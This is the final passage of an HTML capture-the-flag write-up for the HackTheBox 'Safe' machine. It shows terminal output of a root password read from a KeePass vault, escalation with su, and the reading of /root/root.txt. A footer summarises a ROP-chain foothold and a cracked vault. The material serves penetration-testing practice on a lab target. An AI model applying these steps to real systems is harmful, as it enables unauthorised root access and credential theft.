+<span class="pr">kpcli:/&gt;</span> <span class="cmd">cd MyPasswords/</span>
+<span class="pr">kpcli:/MyPasswords&gt;</span> <span class="cmd">ls</span>
+=== Entries ===
+1. Root password
+<span class="pr">kpcli:/MyPasswords&gt;</span> <span class="cmd">show -f Root\ password</span>
+Title: Root password
+Uname: root
+ Pass: [************]</pre></div></div>
+    <p>I think I'm done here. Let's go grab the flag.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">su root</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">user@safe:~$</span> <span class="cmd">su root</span>
+Password:
+<span class="pr">root@safe:~#</span> <span class="cmd">whoami</span>
+root
+<span class="pr">root@safe:~#</span> <span class="cmd">cat /root/root.txt</span>
+d**************************</pre></div></div>
+    <img class="shot" src="img/safe_pwn.png" alt="Safe pwned" loading="lazy">
+  </section>
+
+  <section id="captured">
+    <div class="sec-head"><span class="sec-num">✓</span><h2>Captured<span class="sub">both flags · full compromise</span></h2></div>
+    <div class="flags">
+      <div class="flag">
+        <span class="name">user.txt</span>
+        <span class="path">/home/user/user.txt</span>
+        <span class="val">7·······················</span>
+        <span class="status">captured as user</span>
+      </div>
+      <div class="flag root">
+        <span class="name">root.txt</span>
+        <span class="path">/root/root.txt</span>
+        <span class="val">d·······················</span>
+        <span class="status">captured as root</span>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div>Safe · HackTheBox · Linux · rooted by db-d2</div>
+    <div class="paths">
+      <span>foothold  ROP chain vs. the :1337 binary (NX on, no canary)</span>
+      <span>root      KeePass vault cracked with IMG_0547.JPG as the key file</span>
+    </div>
+  </footer>
+
+</main>
+
+</body>
+</html>
